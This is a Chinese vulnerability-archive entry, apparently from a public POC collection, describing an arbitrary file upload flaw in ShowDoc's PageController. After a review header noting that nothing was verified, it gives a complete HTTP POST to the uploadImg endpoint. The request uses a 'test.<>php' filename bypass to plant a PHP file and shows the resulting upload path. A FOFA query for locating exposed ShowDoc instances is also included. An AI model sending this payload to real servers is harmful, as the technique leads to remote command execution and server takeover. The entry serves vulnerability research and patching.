---

source: "wy876 漏洞文库"
product: "ShowDoc version unspecified"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "ShowDocPageController存在任意文件上传漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：同uploadImg <>绕过与可执行上传目录"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-6a99f595cc77e47078ea280c"
entity_id: "ve-6a99f595cc77e47078ea280c"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：同uploadImg &lt;&gt;绕过与可执行上传目录

- **事实待核（1）**：与407/409同payload，仅固定落点时间不同，无新机制；影响版本只产品。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **来源与引用处置（2）**：代码块rust错标签，Host空/无响应内容；独立原文链接可保留作为出处。保留这部分来源材料并与技术结论分开；其引用或宣传内容不能补足本文漏洞的证据。

- **结论使用边界（3）**：不能据示例静态文件路径泛化任何目标。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ShowDoc PageController存在任意文件上传漏洞

# 一、漏洞简介
ShowDoc是一个非常适合IT团队的在线文档分享工具，它可以加快团队之间沟通的效率。通过showdoc，你可以方便地使用markdown语法来书写出美观的API文档、数据字典文档、技术文档、在线excel文档等等。ShowDoc系统存在任意文件上传漏洞，攻击者可以通过上传恶意文件执行任意命令，获取服务器管理权限。

# 二、影响版本
+ ShowDoc

# 三、资产测绘
+ fofa`app="ShowDoc"`
+ 特征


# 四、漏洞复现
```http
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Content-Length: 241
Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617
Accept-Encoding: gzip

----------------------------921378126371623762173617
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<?php phpinfo();?>
----------------------------921378126371623762173617--
```


```rust
http://127.0.0.1:8000/Public/Uploads/2024-05-30/66577ab51bb29.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tw1q4kmr0efcmd8m>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
